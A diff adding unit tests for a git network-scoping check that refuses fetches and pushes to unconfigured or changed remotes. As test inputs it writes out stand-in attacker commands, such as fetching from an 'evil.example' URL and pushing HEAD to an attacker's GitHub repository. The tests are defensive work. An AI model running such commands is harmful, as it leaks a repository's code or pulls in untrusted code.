@@ -216,6 +216,23 @@ describe('planScopedNetwork', () => {
     assert.match(none('git clone https://attacker.example/x'), /not a configured remote host/)
   })
 
+  it('refuses a URL or name that is not a configured remote', () => {
+    assert.match(none('git fetch https://evil.example/x.git'), /not configured/)
+    assert.match(none('git push https://github.com/attacker/drop HEAD'), /not configured/)
+    assert.match(none('git ls-remote upstream'), /not configured/)
+  })
+
+  it('refuses a remote whose URL was not vouched for', () => {
+    const repo = {
+      ...facts(),
+      unvouchedRemotes: new Map([['fork', 'remote fork changed since the workspace was trusted']]),
+    }
+    assert.match(none('git push fork feature', repo), /changed since/)
+    // The implicit form could reach any remote, so one unvouched remote refuses it.
+    assert.match(none('git fetch --prune', repo), /changed since/)
+    plan('git fetch origin', repo)
+  })
+
   it('needs a network command', () => {
     none('git status && ls')
   })
